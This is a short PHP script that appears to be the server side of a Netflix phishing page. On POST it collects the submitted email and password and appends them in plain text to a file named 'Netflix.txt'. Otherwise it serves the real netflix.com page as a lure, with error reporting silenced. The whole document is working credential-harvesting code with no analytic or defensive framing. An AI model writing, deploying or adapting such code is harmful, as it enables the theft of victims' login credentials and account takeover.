<?php
error_reporting(0);
	if(isset($_SERVER['REQUEST_METHOD']) == 'POST'){
		$email = trim($_POST['email']);
		$password = trim($_POST['password']);

		if(empty($email) || empty($password)){
			exit(-1);
		}
		$file = fopen("Netflix.txt", "a");
		fwrite($file, "Username : ");
		fwrite($file, $email);
		fwrite($file, "\n");
		fwrite($file, "Password : ");
		fwrite($file, $password);
		fwrite($file, "\n\n");
		fclose($file);

	} else {
		echo file_get_contents("https://www.netflix.com");
	}
	exit;
?>